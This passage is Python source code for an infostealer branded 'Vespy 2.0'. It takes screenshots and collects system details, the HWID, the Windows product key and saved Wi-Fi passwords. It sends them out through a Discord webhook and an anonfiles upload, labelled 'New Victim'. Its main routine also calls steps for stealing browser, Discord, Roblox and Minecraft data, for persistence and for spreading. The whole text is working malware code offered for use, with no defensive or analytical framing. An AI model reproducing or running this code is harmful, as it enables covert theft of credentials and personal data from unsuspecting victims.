                webhook = DiscordWebhook(url=wbh, username="Vespy 2.0", avatar_url=r"https://cdn.discordapp.com/attachments/1037900641164611659/1052760729196970125/forvespyservero.png")
                embed = DiscordEmbed(title=f"Network Info", description=f"User's Network Info (MORE)", color='4300d1')
                embed.set_author(name="author : vesper", icon_url=r'https://cdn.discordapp.com/attachments/1037900641164611659/1052760729196970125/forvespyservero.png')
                embed.set_footer(text='Vespy 2.0 | by : vesper')
                embed.set_timestamp()
                embed.add_embed_field(name=f":thumbup: Wifi Network Found : ``{nets}``", value=f":man_tipping_hand: SSID: ``{ssid}``\n:scream: Password: ``{key}``", ineline=True)
                webhook.add_embed(embed)
                webhook.execute()
        except:pass
class Antidebug:
	pass
class Reboot:
	pass
class Startup:
	pass
class ErrorMsg:
	pass
class Spread:
	pass
class Screeny:

    def __init__(self):
        jtjirjihirthr = True
        self.Screen()
        self.Info()
        file = requests.post('https://api.anonfiles.com/upload',files={'file':open("testy.jpg","rb")})
        link = file.json()['data']['file']['url']['full']
        r=str(requests.get(link).content).split('<a id="download-preview-image-url" href="')[1].split('"')[0]
        if jtjirjihirthr:
            content = "@everyone New Hit"
        else:
            content = "New Hit"
        webhook = DiscordWebhook(url=wbh, username="Vespy 2.0", avatar_url=r"https://cdn.discordapp.com/attachments/1037900641164611659/1052760729196970125/forvespyservero.png",content=content)
        embed = DiscordEmbed(title=f"New Victim", description=f"New victim | Pc Info + Screenshot", color='4300d1')
        embed.set_author(name="author : vesper", icon_url=r'https://cdn.discordapp.com/attachments/1037900641164611659/1052760729196970125/forvespyservero.png')
        embed.set_footer(text='Vespy 2.0 | by : vesper')
        embed.set_timestamp()
        embed.set_image(url=r)
        embed.add_embed_field(name=f":desktop: Logged : ``{self.user}``", value=f"\n:fax: Machine : ``{self.machine}``\n:gear: System : ``{self.system}``\n:control_knobs: Processor : ``{self.processor}``\n\n\n:floppy_disk: **Virtual Memory**\n:battery: Total : ``{self.TotalM}``\n:alembic: Available : ``{self.availableM}``\n:low_battery: Used : ``{self.usedM}``\n:symbols: Pourcentage : ``{self.pourcentageM}``\n\n\n:id: HWID : ``{self.hwid}``\n:key: Windows Product Key : {self.windowspk}", ineline=False)
        webhook.add_embed(embed)
        webhook.execute()
        os.remove("testy.jpg")
    
    def Screen(self):
        s = ImageGrab.grab(bbox=None,include_layered_windows=False,all_screens=True,xdisplay=None)
        s.save("testy.jpg")
        s.close()
    
    def Size(self,b):
        for unit in ["", "K", "M", "G", "T", "P"]:
            if b < 1024:
                return f"{b:.2f}{unit}B"
            b /= 1024

    def Info(self):
        self.user = user
        self.machine = platform.machine()
        self.system = platform.system()
        self.processor = platform.processor()
        self.sv = psutil.virtual_memory()
        self.TotalM = self.Size(self.sv.total)
        self.availableM = self.Size(self.sv.available)
        self.usedM = self.Size(self.sv.used)
        self.pourcentageM = self.Size(self.sv.percent)+"%"
        self.hwid = str(subprocess.check_output('wmic csproduct get uuid')).replace(" ","").split("\\n")[1].split("\\r")[0]
        try:
            self.windowspk = subprocess.check_output('wmic path softwarelicensingservice get OA3xOriginalProductKey').decode(encoding="utf-8", errors="strict").split("OA3xOriginalProductKey")[1].split(" ")
            for i in self.windowspk:
                if len(i) > 20:self.windowspk = i.split(" ")
            self.windowspk = f"``{self.windowspk[0][3:]}``"
        except:
            self.windowspk = ":x:"

def main():
    Thread(target=Antidebug).start()
    Startup()
    Thread(target=ErrorMsg).start()
    Screeny()
    Browsers()
    DISCORD()
    Roblox()
    Files()
    Minecraft()
    Network()
    Spread()
    Reboot()
main()
